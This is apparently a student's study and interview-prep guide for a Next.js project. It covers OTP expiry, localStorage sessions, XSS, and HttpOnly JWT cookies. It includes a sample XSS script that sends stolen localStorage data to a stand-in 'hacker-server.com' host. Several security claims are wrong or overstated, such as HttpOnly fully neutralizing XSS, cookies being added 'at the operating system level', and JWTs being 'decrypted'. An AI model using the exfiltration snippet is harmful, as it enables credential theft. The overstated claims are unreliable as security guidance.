# Phase 4: Authentication, Security & State Management

This phase explores how we verify user identity, maintain their session across page reloads, and the critical computer science concepts behind securing that data from malicious actors.

---

## 1. Identity Verification & The OTP Flow

In your `app/api/manager/register/route.ts` and `app/api/auth/send-otp/route.ts`, you implemented a Two-Factor/OTP (One Time Password) registration flow.

### The CS Concept: Time-To-Live (TTL)
When you generate an OTP, you don't just store the code. You also store an `expiresAt` DateTime. 
*   **Why?** Cryptographically, a 6-digit number is extremely easy to brute-force.
*   **The Defense:** By enforcing a strict 10-minute TTL, you mathematically guarantee that the window of opportunity slams shut before a bot can succeed. You also delete the OTP immediately after it's successfully used to prevent **Replay Attacks**.

### How you did this in code:

**1. Setting the TTL (`app/api/auth/send-otp/route.ts`)**
```typescript
// Set expiration to exactly 10 minutes from 'now'
const expiresAt = new Date(Date.now() + 10 * 60 * 1000);

await prisma.oTP.upsert({
  where: { email },
  update: { code, expiresAt },
  create: { email, code, expiresAt },
});
```

**2. Enforcing TTL & Preventing Replay Attacks (`app/api/manager/register/route.ts`)**
```typescript
// Enforce TTL: Reject if current time is past expiration
if (new Date() > otpRecord.expiresAt) {
  return NextResponse.json({ message: "OTP code has expired" }, { status: 400 });
}

// ... (Create Store in Database) ...

// PREVENT REPLAY ATTACKS: Delete the OTP so it can never be used again
await prisma.oTP.delete({
  where: { id: otpRecord.id },
});
```

---

## 2. Session Architecture: Stateless vs Stateful

Once a manager successfully logs in, the browser needs to "remember" who they are as they navigate.

If we look at your frontend code (`app/manager-login/client.tsx`):
```javascript
// Save manager details to localStorage
localStorage.setItem("managerDetails", JSON.stringify(data))
```

### The What: Stateless Sessions
Your backend is entirely **Stateless**. The Node.js server does not keep a RAM cache of "who is logged in." Instead, the client (browser) holds the state.
*   **Pros:** It is incredibly easy to scale horizontally. Any request can hit any server instance behind a load balancer without issue.
*   **Cons:** It is difficult to instantly invalidate a session. If you ban a user, but their browser still has the token in `localStorage`, they theoretically remain logged in until the client decides to clear it. Additionally, `localStorage` is highly vulnerable to XSS attacks (see below).

---

## 3. CS Core: Security Attack Vectors (XSS)

As a Senior Engineer, you must be able to critique your own architecture. Storing full authentication state in `localStorage` is a functional starting point, but it introduces a major security vulnerability.

### The Attack: Cross-Site Scripting (XSS)
`localStorage` is completely accessible via JavaScript. If a malicious actor manages to inject a bad script into your website (e.g., through a compromised third-party NPM package like an analytics tracker), that script runs in the user's browser.

The script can simply execute:
```javascript
const stolenData = localStorage.getItem("managerDetails");
fetch("https://hacker-server.com/steal", { body: stolenData });
```
Instantly, the hacker has stolen the manager's identity and can impersonate them.

### How You Implemented HttpOnly Cookies in Shop-Smart
To fix this, we just refactored your architecture to use **HttpOnly Cookies containing JSON Web Tokens (JWTs)**.
*   **Why?** An `HttpOnly` cookie is a special type of cookie that the browser sends automatically with every network request, but **JavaScript is mathematically forbidden from reading it**. 
*   Even if a hacker successfully injects an XSS script into your page, `document.cookie` will return blank for that token, neutralizing the theft attempt.

#### "If JavaScript can't read the cookie, how do we use it?"
This is a fantastic interview question. The answer is: **The Browser Engine handles it for you.**
1.  **The Silent Hand-off:** When you use `fetch('/api/manager/me')` in your React code, your frontend JavaScript does not need to attach the token. The Google Chrome/Safari internal engine intercepts the network request at the operating system level, silently injects the `Cookie: auth_token=...` HTTP header into the packet, and sends it to the server.
2.  **The Backend Decodes:** The frontend JS never actually knows what the JWT string is. It just makes the `fetch` request. The Node.js backend receives the cookie, decrypts it, and returns a safe JSON response containing the manager's email and store info. The frontend React code uses *that JSON*, not the cookie!

### Your Interview Defense Script
If an interviewer asks how you handled session security, here is your exact answer:

> *"Initially, I used `localStorage` to rapidly prototype the frontend dashboards and prove the core, complex business logic (like Shopify Webhook syncing and the Kafka Event-Driven Architecture). However, I knew `localStorage` was highly vulnerable to Cross-Site Scripting (XSS). So, for the final production build, I ripped out `localStorage` and migrated the authentication flow to use `HttpOnly` cookies signed with `jose` JSON Web Tokens (JWTs). This guarantees that even if a malicious script somehow executes on the page, it cannot steal the manager's login token."*

### Interview Trap: "Why not just use CORS to stop the hacker?"
If the interviewer asks, *"Couldn't you just configure CORS to stop the hacker from stealing the data?"*

**Your Answer:** 
> *"No. CORS protects against OTHER websites making requests to MY API. XSS is completely different. In an XSS attack, the malicious script is running natively on MY actual domain. Because the script originates from my domain, the browser trusts it, and CORS does absolutely nothing to stop it. Only `HttpOnly` prevents the script from reading the token in the first place."*
